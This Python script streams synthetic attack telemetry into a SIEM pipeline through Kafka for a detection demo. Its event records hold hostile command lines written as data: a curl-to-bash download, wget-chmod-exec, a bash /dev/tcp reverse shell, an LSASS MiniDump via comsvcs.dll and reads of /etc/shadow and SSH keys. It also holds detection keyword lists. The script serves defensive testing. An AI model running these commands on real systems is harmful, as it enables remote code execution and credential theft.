#!/usr/bin/env python3
"""
demo_stream.py — Continuous Aegis-Vanguard demo event streamer

Publishes Aegis v1.1 events to Kafka siem.events in a loop so the
dashboard stays populated with realistic attack data flowing through the
full pipeline: demo_stream → siem.events → Engine → siem.alerts → Dashboard.

Event sources (tried in priority order per rule):
  1. Pre-mapped Mordor JSONL files in --events-dir (already Aegis v1.1)
  2. Built-in synthetic scenarios from attack_sim.py

Usage:
  python scripts/demo_stream.py
  python scripts/demo_stream.py --events-dir runtime/mordor --rate 1.5
  python scripts/demo_stream.py --rules auth-brute-force,network-port-scan --count 50
  python scripts/demo_stream.py --dry-run --count 10
"""

from __future__ import annotations

import argparse
import copy
import hashlib
import json
import random
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Path setup — allow importing attack_sim from the same directory
# ---------------------------------------------------------------------------
SCRIPTS_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPTS_DIR.parent
sys.path.insert(0, str(SCRIPTS_DIR))

import attack_sim  # noqa: E402  (after sys.path insert)

# ---------------------------------------------------------------------------
# Aegis v1.1 envelope builder
# ---------------------------------------------------------------------------
_BASE_TS = datetime(2026, 1, 1, 0, 0, 0, tzinfo=timezone.utc)


def _now_utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _process_guid(host: str, pid: int, ts: str) -> str:
    seed = f"{host}|{pid}|{ts}"
    return hashlib.sha256(seed.encode()).hexdigest()


def _split_csv(raw: str, defaults: list[str]) -> list[str]:
    values = [item.strip() for item in raw.split(",") if item.strip()] if raw else []
    merged: list[str] = []
    for item in [*defaults, *values]:
        if item and item not in merged:
            merged.append(item)
    return merged


def _load_runtime_rule_ids(rules_dir: Path) -> set[str]:
    if not rules_dir.exists():
        return set()

    rule_ids: set[str] = set()
    for pattern in ("*.yml", "*.yaml"):
        for rule_file in sorted(rules_dir.glob(pattern)):
            try:
                for line in rule_file.read_text(encoding="utf-8").splitlines():
                    stripped = line.strip()
                    if stripped.startswith("id:"):
                        value = stripped.split(":", 1)[1].strip()
                        if value:
                            rule_ids.add(value)
                        break
            except OSError:
                continue
    return rule_ids


def _prepare_runtime_pools(args: argparse.Namespace) -> dict[str, list[str]]:
    return {
        "hosts": _split_csv(args.host_pool, [args.host, "jump-host-01", "win-workstation-07", "edge-gw-02", "db-prod-01"]),
        "users": _split_csv(args.user_pool, [args.user, "alice", "ubuntu", "administrator", "svc-backup"]),
        "src_ips": _split_csv(args.src_ip_pool, [args.src_ip, "203.0.113.77", "198.51.100.44", "185.220.101.5", "172.16.0.5"]),
        "dst_ips": _split_csv(args.dst_ip_pool, [args.dst_ip, "198.51.100.10", "198.51.100.44", "203.0.113.250", "168.63.129.16"]),
    }


def _mutate_source_record(raw: dict[str, Any], rule_id: str, pools: dict[str, list[str]]) -> tuple[dict[str, Any], str]:
    record = dict(raw)
    host = random.choice(pools["hosts"])
    user = random.choice(pools["users"])
    src_ip = random.choice(pools["src_ips"])
    dst_ip = random.choice(pools["dst_ips"])
    ts = _now_utc()

    record["ts"] = ts
    kind = str(record.get("kind", "process_start"))

    if kind == "auth_failure":
        if rule_id == "windows-ntlm-brute-force":
            record["user_name"] = random.choice(["administrator", "pgustavo", "sysmonsvc", "backupsvc"])
            record["method"] = random.choice(["domain-ntlm", "interactive-ntlm", "network-kerberos"])
            record["reason"] = random.choice(["wrong_password", "bad_credentials"])
        elif rule_id in {"ext-auth-admin-failure", "ext-privileged-auth-burst"}:
            record["user_name"] = random.choice(["admin", "administrator", "root", "ubuntu"])
            record["method"] = "ssh"
            record["reason"] = "invalid_password"
        else:
            record["user_name"] = record.get("user_name") or random.choice(["admin", "alice", "ubuntu"])
            record["method"] = record.get("method") or "ssh"
            record["reason"] = record.get("reason") or "invalid_password"
        record["src_ip"] = src_ip
        return record, host

    pid = random.randint(1200, 32000)
    record["pid"] = pid
    record["process_guid"] = _process_guid(host, pid, ts)

    if kind == "process_start":
        record["ppid"] = random.randint(200, 1800)
        record["uid"] = 0 if rule_id == "windows-lsass-dump" else 1000
        record["user_name"] = user
        record["process_start_time"] = ts

        if rule_id in {"ext-suspicious-download-exec", "sigma-like-download-exec"}:
            record["name"] = "bash"
            record["exe"] = "/usr/bin/bash"
            record["cmdline"] = "bash -lc 'curl -fsSL https://cdn.example.invalid/bootstrap.sh | bash'"
        elif rule_id == "ext-download-chmod-exec":
            tmp_path = f"/tmp/.cache-{random.randint(100, 999)}/agent"
            record["name"] = "bash"
            record["exe"] = "/usr/bin/bash"
            record["cmdline"] = f"bash -lc 'wget -q https://cdn.example.invalid/a.sh -O {tmp_path}; chmod +x {tmp_path}; {tmp_path} --daemon'"
        elif rule_id == "ext-interpreter-tmp-exec":
            interpreter = random.choice(["python3", "bash", "sh", "perl"])
            record["name"] = interpreter
            record["exe"] = f"/tmp/.stage-{random.randint(10, 99)}/{interpreter}"
            record["cmdline"] = f"{record['exe']} /tmp/.stage-{random.randint(10, 99)}/loader.py --stage beacon"
        elif rule_id == "ext-dns-tunnel-tool-exec":
            tool = random.choice(["iodine", "dnscat2", "dns2tcp"])
            record["name"] = tool
            record["exe"] = f"/usr/bin/{tool}"
            record["cmdline"] = f"{tool} -f tunnel.example.invalid"
        elif rule_id == "ext-recon-scanner-tool-exec":
            tool = random.choice(["nmap", "masscan", "zmap"])
            record["name"] = tool
            record["exe"] = f"/usr/bin/{tool}"
            record["cmdline"] = f"{tool} --top-ports 100 {dst_ip}"
        elif rule_id == "ext-linux-reverse-shell-one-liner":
            record["name"] = "bash"
            record["exe"] = "/usr/bin/bash"
            record["cmdline"] = f"bash -c 'bash -i >& /dev/tcp/{dst_ip}/{random.choice([4444, 4445, 9001, 31337])} 0>&1'"
        elif rule_id == "windows-lsass-dump":
            record["name"] = "rundll32.exe"
            record["exe"] = "C:\\Windows\\System32\\rundll32.exe"
            record["cmdline"] = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 628 C:\\Windows\\Temp\\lsass.dmp full"

        return record, host

    if kind == "network_connect":
        record["src_ip"] = src_ip
        record["dst_ip"] = dst_ip
        record["direction"] = "outbound"
        if rule_id == "ext-rare-c2-port-egress":
            record["dst_port"] = random.choice([1337, 2222, 4444, 4445, 5555, 6666, 7777, 8444, 9001, 31337])
            record["protocol"] = "tcp"
        elif rule_id == "ext-smb-rdp-lateral-movement":
            record["dst_port"] = random.choice([445, 3389, 5985, 5986])
            record["protocol"] = "tcp"
        elif rule_id == "network-port-scan":
            record["dst_port"] = random.choice([22, 80, 443, 445, 3389, 5985, 8080, 8444])
            record["protocol"] = "tcp"
        return record, host

    if kind == "file_open":
        record["user_name"] = user
        if rule_id == "ext-sensitive-file-enum":
            record["path"] = random.choice(["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"])
            record["flags"] = ["O_RDONLY"]
            record["result"] = "success"
        elif rule_id in {"ext-data-staging-archive", "ext-archive-created-in-tmp"}:
            record["path"] = random.choice(["/tmp/stage-home.tgz", "/var/tmp/cache.7z", "/dev/shm/archive.tar.gz"])
            record["flags"] = ["O_CREAT", "O_WRONLY"]
            record["result"] = "success"
        elif rule_id == "windows-lsass-dump":
            record["path"] = "C:\\Windows\\System32\\lsass.exe"
            record["flags"] = ["PROCESS_VM_READ", "access=0x1410"]
            record["result"] = "success"
        elif rule_id == "ext-temp-dropper-write":
            record["path"] = random.choice(["/tmp/dropper.bin", "/var/tmp/install.sh", "/dev/shm/.agent"])
            record["flags"] = ["O_CREAT", "O_WRONLY"]
            record["result"] = "success"
        return record, host

    return record, host


def _refresh_canonical_envelope(raw: dict[str, Any]) -> dict[str, Any]:
    envelope = copy.deepcopy(raw)
    now = _now_utc()
    envelope["event_id"] = uuid.uuid4().hex
    envelope["trace_id"] = str(uuid.uuid4())
    envelope["ts"] = now

    event = envelope.get("event")
    if isinstance(event, dict):
        process = event.get("process")
        if isinstance(process, dict):
            process["process_start_time"] = now

    return envelope


def _materialize_envelope(raw: dict[str, Any], rule_id: str, args: argparse.Namespace, pools: dict[str, list[str]]) -> dict[str, Any]:
    if "schema_version" in raw:
        return _refresh_canonical_envelope(raw)

    mutated, host = _mutate_source_record(raw, rule_id, pools)
    return build_aegis_envelope(mutated, host, args.agent_id, args.tenant_id)


def _print_coverage(runtime_rule_ids: set[str], mordor_pool: dict[str, list[dict]], synthetic_pool: dict[str, list[dict]]) -> None:
    if not runtime_rule_ids:
        return

    mordor_backed = sorted(rule_id for rule_id in runtime_rule_ids if mordor_pool.get(rule_id))
    synthetic_backed = sorted(rule_id for rule_id in runtime_rule_ids if not mordor_pool.get(rule_id) and synthetic_pool.get(rule_id))
    missing = sorted(rule_id for rule_id in runtime_rule_ids if not mordor_pool.get(rule_id) and not synthetic_pool.get(rule_id))

    print(f"[demo_stream] Rule coverage: mordor={len(mordor_backed)} synthetic={len(synthetic_backed)} missing={len(missing)}")
    if mordor_backed:
        print(f"[demo_stream] Mordor-backed rules   : {', '.join(mordor_backed)}")
    if synthetic_backed:
        print(f"[demo_stream] Synthetic-backed rules: {', '.join(synthetic_backed)}")
    if missing:
        print(f"[demo_stream] Missing rules         : {', '.join(missing)}")


def build_aegis_envelope(raw: dict[str, Any], host: str, agent_id: str, tenant_id: str) -> dict[str, Any]:
    """Wrap an attack_sim SourceRecord dict into an Aegis v1.1 canonical envelope.

    The output format mirrors exactly what CanonicalEventBuilder::build() produces
    in collector/src/event_builder.cpp so the Engine rules match correctly.
    """
    kind = raw.get("kind", "process_start")
    ts = raw.get("ts") or _now_utc()

    _kind_to_event_type = {
        "process_start": "process_start",
        "network_connect": "network_connect",
        "file_open": "file_open",
        "auth_failure": "auth_failure",
    }
    event_type = _kind_to_event_type.get(kind, "process_start")
    severity = "medium" if kind == "auth_failure" else "info"

    pid = raw.get("pid", 0)
    pg = raw.get("process_guid") or _process_guid(host, pid, ts)

    envelope: dict[str, Any] = {
        "schema_version": "v1.1",
        "event_id": uuid.uuid4().hex,
        "ts": ts,
        "host": host,
        "agent_id": agent_id,
        "source": "demo.stream",
        "event_type": event_type,
        "severity": severity,
        "tenant_id": tenant_id,
        "trace_id": str(uuid.uuid4()),
    }

    if kind == "process_start":
        envelope["process_guid"] = pg
        envelope["event"] = {
            "process": {
                "pid": pid,
                "ppid": raw.get("ppid", 0),
                "uid": raw.get("uid", 0),
                "user_name": raw.get("user_name", ""),
                "name": raw.get("name", ""),
                "exe": raw.get("exe", ""),
                "cmdline": raw.get("cmdline", ""),
                "process_start_time": raw.get("process_start_time", ts),
            }
        }
    elif kind == "network_connect":
        envelope["process_guid"] = pg
        envelope["event"] = {
            "network": {
                "pid": pid,
                "process_guid": pg,
                "protocol": raw.get("protocol", "tcp"),
                "src_ip": raw.get("src_ip", ""),
                "src_port": raw.get("src_port", 0),
                "dst_ip": raw.get("dst_ip", ""),
                "dst_port": raw.get("dst_port", 0),
                "direction": raw.get("direction", "outbound"),
            }
        }
    elif kind == "file_open":
        envelope["process_guid"] = pg
        envelope["event"] = {
            "file": {
                "pid": pid,
                "process_guid": pg,
                "user_name": raw.get("user_name", ""),
                "path": raw.get("path", ""),
                "flags": raw.get("flags", []),
                "result": raw.get("result", "success"),
            }
        }
    elif kind == "auth_failure":
        envelope["event"] = {
            "auth": {
                "user_name": raw.get("user_name", ""),
                "method": raw.get("method", "password"),
                "src_ip": raw.get("src_ip", ""),
                "reason": raw.get("reason", "invalid_credentials"),
            }
        }
    else:
        envelope["event"] = {}

    return envelope


# ---------------------------------------------------------------------------
# Rule → scenario mapping
# ---------------------------------------------------------------------------
# Each entry: rule_id → list of (scenario_fn, kwargs_without_base)
# The scenario functions are called as: fn(_BASE_TS, **kwargs)
_RULE_SCENARIOS: dict[str, list[tuple]] = {
    # Auth rules
    "ext-auth-source-bruteforce":  [(attack_sim.scenario_auth_burst, {"src_ip": "203.0.113.77", "attempts": 8})],
    "ext-privileged-auth-burst":   [(attack_sim.scenario_auth_burst, {"src_ip": "10.0.0.99", "attempts": 6, "user_name": "root"})],
    "auth-brute-force":            [(attack_sim.scenario_auth_burst, {"src_ip": "203.0.113.77", "attempts": 10})],
    "auth-password-spray":         [(attack_sim.scenario_auth_burst, {"src_ip": "185.220.101.5", "attempts": 5, "method": "password"})],
    "ext-auth-admin-failure":      [(attack_sim.scenario_auth_burst, {"src_ip": "198.51.100.9", "attempts": 5, "user_name": "administrator"})],
    "windows-ntlm-brute-force":    [(attack_sim.scenario_auth_burst, {"src_ip": "172.16.0.5", "attempts": 7, "user_name": "administrator", "method": "domain-ntlm", "reason": "wrong_password"})],
    # Process / execution rules
    "ext-linux-reverse-shell-one-liner": [(attack_sim.scenario_reverse_shell, {})],
    "ext-temp-dropper-write":            [(attack_sim.scenario_temp_dropper, {})],
    "ext-download-chmod-exec":           [(attack_sim.scenario_download_chmod_exec, {})],
    "ext-suspicious-download-exec":      [(attack_sim.scenario_download_pipe_bash, {})],
    "sigma-like-download-exec":          [(attack_sim.scenario_download_pipe_bash, {})],
    "ext-interpreter-tmp-exec":          [(attack_sim.scenario_tmp_interpreter_exec, {})],
    "ext-dns-tunnel-tool-exec":          [(attack_sim.scenario_dns_tunnel_tool, {})],
    "ext-recon-scanner-tool-exec":       [(attack_sim.scenario_port_scan, {})],
    "windows-lsass-dump":                [(attack_sim.scenario_lsass_dump, {})],
    # Network rules
    "ext-rare-c2-port-egress":         [(attack_sim.scenario_port_scan, {})],
    "network-port-scan":               [(attack_sim.scenario_port_scan, {})],
    "network-rare-port":               [(attack_sim.scenario_port_scan, {})],
    "ext-smb-rdp-lateral-movement":    [(attack_sim.scenario_port_scan, {})],
    # File / staging rules
    "ext-data-staging-archive":    [(attack_sim.scenario_data_staging, {})],
    "ext-archive-created-in-tmp":  [(attack_sim.scenario_data_staging, {})],
    "ext-sensitive-file-enum":     [(attack_sim.scenario_sensitive_file_enum, {})],
}

# Rules that should fire proportionally more often
_RULE_WEIGHTS: dict[str, float] = {
    "ext-auth-source-bruteforce":        3.0,
    "auth-brute-force":                  2.5,
    "ext-linux-reverse-shell-one-liner": 2.5,
    "network-port-scan":                 2.0,
    "ext-temp-dropper-write":            2.0,
    "ext-data-staging-archive":          1.5,
    "windows-lsass-dump":                1.5,
    "ext-suspicious-download-exec":      1.8,
    "ext-download-chmod-exec":           1.8,
    "ext-smb-rdp-lateral-movement":      1.7,
    "windows-ntlm-brute-force":          1.8,
}


def _build_synthetic_pool(host: str, user: str, src_ip: str, dst_ip: str) -> dict[str, list[dict]]:
    """Generate synthetic event dicts for every rule using attack_sim scenarios."""
    import inspect

    pool: dict[str, list[dict]] = {}
    for rule_id, recipes in _RULE_SCENARIOS.items():
        events: list[dict] = []
        for fn, extra_kwargs in recipes:
            # Build kwargs: inject host/user/src_ip/dst_ip where signature accepts them.
            candidate = {"host": host, "user": user, "src_ip": src_ip, "dst_ip": dst_ip, **extra_kwargs}
            sig = inspect.signature(fn)
            filtered = {k: v for k, v in candidate.items() if k in sig.parameters}
            result = fn(_BASE_TS, **filtered)
            events.extend(result)
        pool[rule_id] = events
    return pool


# ---------------------------------------------------------------------------
# Mordor pre-mapped event loader
# ---------------------------------------------------------------------------

def _infer_rule_ids_from_canonical(event: dict[str, Any]) -> list[str]:
    """Infer likely rule_ids from a canonical Aegis event envelope.

    This enables using generic Mordor exports (for example windows_campaign.aegis.jsonl)
    even when file names are not already split by demo target.
    """
    inferred: list[str] = []
    event_type = str(event.get("event_type", ""))

    if event_type == "auth_failure":
        auth = event.get("event", {}).get("auth", {}) if isinstance(event.get("event"), dict) else {}
        method = str(auth.get("method", "")).lower()
        user = str(auth.get("user_name", "")).lower()

        inferred.extend([
            "auth-brute-force",
            "auth-password-spray",
            "ext-auth-source-bruteforce",
        ])
        if "ntlm" in method or "kerberos" in method:
            inferred.append("windows-ntlm-brute-force")
        if user in {"administrator", "admin", "root", "system"}:
            inferred.extend(["ext-auth-admin-failure", "ext-privileged-auth-burst"])

    elif event_type == "network_connect":
        network = event.get("event", {}).get("network", {}) if isinstance(event.get("event"), dict) else {}
        dst_port = int(network.get("dst_port", 0) or 0)

        if dst_port in {1337, 2222, 4444, 4445, 5555, 6666, 7777, 8444, 9001, 31337}:
            inferred.append("ext-rare-c2-port-egress")
        if dst_port in {445, 3389, 5985, 5986}:
            inferred.append("ext-smb-rdp-lateral-movement")
        if dst_port in {22, 80, 443, 445, 3389, 5985, 8080, 8444, 9001, 1337, 31337}:
            inferred.append("network-port-scan")

    elif event_type == "file_open":
        file_evt = event.get("event", {}).get("file", {}) if isinstance(event.get("event"), dict) else {}
        path = str(file_evt.get("path", "")).lower()
        flags_raw = file_evt.get("flags", [])
        flags = [str(flag).lower() for flag in flags_raw] if isinstance(flags_raw, list) else [str(flags_raw).lower()]

        if "lsass" in path or any("0x1410" in flag for flag in flags):
            inferred.append("windows-lsass-dump")

        if any(token in path for token in ["/etc/passwd", "/etc/shadow", "id_rsa", "winlogon", "lsa"]):
            inferred.append("ext-sensitive-file-enum")

        if any(token in path for token in [".zip", ".7z", ".tar", ".tgz", "/tmp/"]):
            inferred.extend(["ext-data-staging-archive", "ext-archive-created-in-tmp"])

    elif event_type == "process_start":
        process = event.get("event", {}).get("process", {}) if isinstance(event.get("event"), dict) else {}
        cmd = str(process.get("cmdline", "")).lower()
        name = str(process.get("name", "")).lower()

        if any(token in cmd for token in ["comsvcs.dll", "minidump", "lsass.dmp"]):
            inferred.append("windows-lsass-dump")
        if any(tool in name for tool in ["nmap", "masscan", "zmap"]):
            inferred.append("ext-recon-scanner-tool-exec")

    # Stable order + de-dup
    deduped: list[str] = []
    for rule_id in inferred:
        if rule_id not in deduped:
            deduped.append(rule_id)
    return deduped

def _load_mordor_pool(events_dir: Path, campaign_file: Path) -> dict[str, list[dict]]:
    """Load pre-mapped Aegis v1.1 events from *.aegis.jsonl files.

    Matches JSONL files to rule_ids via the campaign manifest.
    Events are already in Aegis v1.1 format — published as-is.
    """
    pool: dict[str, list[dict]] = {}
    if not events_dir.exists():
        return pool

    # Build target→rule_ids index from campaign manifest
    target_to_rules: dict[str, list[str]] = {}
    if campaign_file.exists():
        try:
            manifest = json.loads(campaign_file.read_text(encoding="utf-8"))
            for target in manifest.get("targets", []):
                name = target.get("name", "")
                rule_ids = target.get("rule_ids", [name])
                target_to_rules[name] = rule_ids
        except (json.JSONDecodeError, OSError):
            pass

    for jsonl_file in sorted(events_dir.rglob("*.aegis.jsonl")):
        # Derive target name from filename: "windows-ntlm-bruteforce-cluster.aegis.jsonl" → …cluster
        stem = jsonl_file.name
        if stem.endswith(".aegis.jsonl"):
            stem = stem[: -len(".aegis.jsonl")]
        explicit_rule_ids = target_to_rules.get(stem, [])

        events: list[dict] = []
        try:
            for line in jsonl_file.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line:
                    try:
                        events.append(json.loads(line))
                    except json.JSONDecodeError:
                        pass
        except OSError:
            pass

        if events:
            if explicit_rule_ids:
                for rule_id in explicit_rule_ids:
                    pool.setdefault(rule_id, []).extend(events)
                continue

            # Fallback for generic canonical files: infer rule_ids from event content.
            for event in events:
                inferred_rule_ids = _infer_rule_ids_from_canonical(event)
                for rule_id in inferred_rule_ids:
                    pool.setdefault(rule_id, []).append(event)

            # If no campaign manifest provided, preserve legacy stem-based behavior.
            if not target_to_rules:
                pool.setdefault(stem, []).extend(events)

    return pool


# ---------------------------------------------------------------------------
# Kafka producer
# ---------------------------------------------------------------------------

def _make_kafka_producer(broker: str):
    try:
        from kafka import KafkaProducer
    except ImportError:
        print(
            "ERROR: kafka-python not installed. Run: pip install kafka-python",
            file=sys.stderr,
        )
        sys.exit(1)

    return KafkaProducer(
        bootstrap_servers=[broker],
        value_serializer=lambda v: json.dumps(v, separators=(",", ":")).encode("utf-8"),
        key_serializer=lambda k: k.encode("utf-8") if k else None,
        acks="all",
        retries=3,
    )


# ---------------------------------------------------------------------------
# Main streaming loop
# ---------------------------------------------------------------------------

def stream(args: argparse.Namespace) -> None:
    pools = _prepare_runtime_pools(args)
    events_dir = (
        Path(args.events_dir) if args.events_dir else (REPO_ROOT / "runtime" / "mordor")
    )
    campaign_file = (
        Path(args.campaign) if args.campaign else (SCRIPTS_DIR / "demo_stream_campaign.json")
    )
    rules_dir = Path(args.rules_dir) if args.rules_dir else (REPO_ROOT / "rules" / "runtime")
    runtime_rule_ids = _load_runtime_rule_ids(rules_dir)

    broker_info = "dry-run" if args.dry_run else args.broker
    print(f"[demo_stream] broker={broker_info}  topic={args.topic}  rate={args.rate}s")

    # --- Build event pools ---
    print("[demo_stream] Loading pre-mapped Mordor events ...", end=" ", flush=True)
    mordor_pool = _load_mordor_pool(events_dir, campaign_file)
    print(f"{sum(len(v) for v in mordor_pool.values())} events across {len(mordor_pool)} rules")

    print("[demo_stream] Building synthetic event pool  ...", end=" ", flush=True)
    synthetic_pool = _build_synthetic_pool(args.host, args.user, args.src_ip, args.dst_ip)
    print(f"{sum(len(v) for v in synthetic_pool.values())} events across {len(synthetic_pool)} rules")
    _print_coverage(runtime_rule_ids, mordor_pool, synthetic_pool)

    # --- Merge: Mordor preferred, synthetic as fallback ---
    all_rule_ids: set[str] = runtime_rule_ids or (set(mordor_pool) | set(synthetic_pool))

    requested: set[str] | None = None
    if args.rules:
        requested = {r.strip() for r in args.rules.split(",") if r.strip()}
        all_rule_ids &= requested
        missing = requested - all_rule_ids
        if missing:
            print(f"[demo_stream] WARNING: unknown rule(s) ignored: {', '.join(sorted(missing))}")

    merged_pool: dict[str, list[dict]] = {}
    for rule_id in all_rule_ids:
        events = mordor_pool.get(rule_id) or synthetic_pool.get(rule_id) or []
        if events:
            merged_pool[rule_id] = events

    if not merged_pool:
        print(
            "ERROR: no events available. Check --rules, --events-dir, or run mordor_pipeline.py first.",
            file=sys.stderr,
        )
        sys.exit(1)

    rule_ids = sorted(merged_pool)
    weights = [
        _RULE_WEIGHTS.get(r, 1.0) * (1.35 if mordor_pool.get(r) else 1.0)
        for r in rule_ids
    ]

    print(f"[demo_stream] Active rules ({len(rule_ids)}): {', '.join(rule_ids)}")
    print(f"[demo_stream] Total event pool: {sum(len(v) for v in merged_pool.values())} events")
    limit_msg = str(args.count) if args.count > 0 else "∞  (Ctrl-C to stop)"
    print(f"[demo_stream] Events to send: {limit_msg}")
    print()

    producer = None if args.dry_run else _make_kafka_producer(args.broker)

    published = 0
    errors = 0
    start_time = time.monotonic()

    try:
        while args.count == 0 or published < args.count:
            rule_id: str = random.choices(rule_ids, weights=weights, k=1)[0]
            raw = random.choice(merged_pool[rule_id])

            # Mordor events already carry schema_version — forward as-is.
            # Synthetic SourceRecord dicts need wrapping.
            envelope = _materialize_envelope(raw, rule_id, args, pools)

            if args.dry_run:
                print(
                    f"  [dry-run] #{published + 1:04d}  rule={rule_id:<42} "
                    f"type={envelope.get('event_type', '?'):<18} host={envelope.get('host')}"
                )
                published += 1
            else:
                try:
                    key = envelope.get("host", args.host)
                    producer.send(args.topic, value=envelope, key=key)
                    published += 1

                    if not args.quiet:
                        ev_type = envelope.get("event_type", "?")
                        src = envelope.get("source", "?")
                        print(
                            f"  [+] #{published:04d}  rule={rule_id:<42} "
                            f"type={ev_type:<18} src={src}  ts={envelope.get('ts', '')}"
                        )

                    # Flush and print stats every 20 events
                    if published % 20 == 0:
                        producer.flush()
                        elapsed = time.monotonic() - start_time
                        rate_actual = published / elapsed if elapsed > 0 else 0.0
                        print(
                            f"\n  [stats] published={published}  errors={errors}  "
                            f"elapsed={elapsed:.1f}s  rate={rate_actual:.2f} evt/s\n"
                        )

                except Exception as exc:
                    errors += 1
                    print(f"  [err] Kafka send failed: {exc}", file=sys.stderr)

            time.sleep(args.rate)

    except KeyboardInterrupt:
        print(f"\n[demo_stream] Interrupted.")

    finally:
        if producer:
            producer.flush()
            producer.close()

        elapsed = time.monotonic() - start_time
        rate_actual = published / elapsed if elapsed > 0 else 0.0
        print(
            f"[demo_stream] Done — published={published}  errors={errors}  "
            f"elapsed={elapsed:.1f}s  avg_rate={rate_actual:.2f} evt/s"
        )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Aegis-Vanguard demo event streamer — publishes Aegis v1.1 events to Kafka siem.events."
    )
    p.add_argument(
        "--broker", default="localhost:9092", metavar="HOST:PORT",
        help="Kafka bootstrap server (default: localhost:9092)",
    )
    p.add_argument(
        "--topic", default="siem.events",
        help="Kafka topic to publish to (default: siem.events)",
    )
    p.add_argument(
        "--rate", type=float, default=1.5, metavar="SEC",
        help="Seconds between events (default: 1.5)",
    )
    p.add_argument(
        "--rules", default="", metavar="RULE_IDS",
        help="Comma-separated rule_ids to include (default: all)",
    )
    p.add_argument(
        "--events-dir", default="", metavar="PATH",
        help="Directory containing *.aegis.jsonl Mordor files (default: runtime/mordor/)",
    )
    p.add_argument(
        "--campaign", default="", metavar="PATH",
        help="Mordor/demo stream campaign JSON manifest (default: scripts/demo_stream_campaign.json)",
    )
    p.add_argument(
        "--rules-dir", default="", metavar="PATH",
        help="Runtime rules directory used to print coverage and select active rules (default: rules/runtime)",
    )
    p.add_argument(
        "--count", type=int, default=0, metavar="N",
        help="Number of events to send then exit (default: 0 = loop forever)",
    )
    p.add_argument(
        "--host", default="lab-host",
        help="Hostname written into each envelope (default: lab-host)",
    )
    p.add_argument(
        "--user", default="alice",
        help="Username used in synthetic scenarios (default: alice)",
    )
    p.add_argument(
        "--src-ip", dest="src_ip", default="203.0.113.77",
        help="Source IP for auth/network scenarios (default: 203.0.113.77)",
    )
    p.add_argument(
        "--dst-ip", dest="dst_ip", default="198.51.100.10",
        help="Destination IP for network scenarios (default: 198.51.100.10)",
    )
    p.add_argument(
        "--host-pool", dest="host_pool", default="",
        help="Optional comma-separated host pool for synthetic randomization",
    )
    p.add_argument(
        "--user-pool", dest="user_pool", default="",
        help="Optional comma-separated user pool for synthetic randomization",
    )
    p.add_argument(
        "--src-ip-pool", dest="src_ip_pool", default="",
        help="Optional comma-separated source IP pool for synthetic randomization",
    )
    p.add_argument(
        "--dst-ip-pool", dest="dst_ip_pool", default="",
        help="Optional comma-separated destination IP pool for synthetic randomization",
    )
    p.add_argument(
        "--agent-id", dest="agent_id", default="demo-stream",
        help="agent_id field in envelope (default: demo-stream)",
    )
    p.add_argument(
        "--tenant-id", dest="tenant_id", default="default",
        help="tenant_id field in envelope (default: default)",
    )
    p.add_argument(
        "--dry-run", action="store_true",
        help="Print events to stdout instead of publishing to Kafka",
    )
    p.add_argument(
        "--quiet", action="store_true",
        help="Suppress per-event output; print stats every 20 events only",
    )
    return p.parse_args()


if __name__ == "__main__":
    stream(_parse_args())
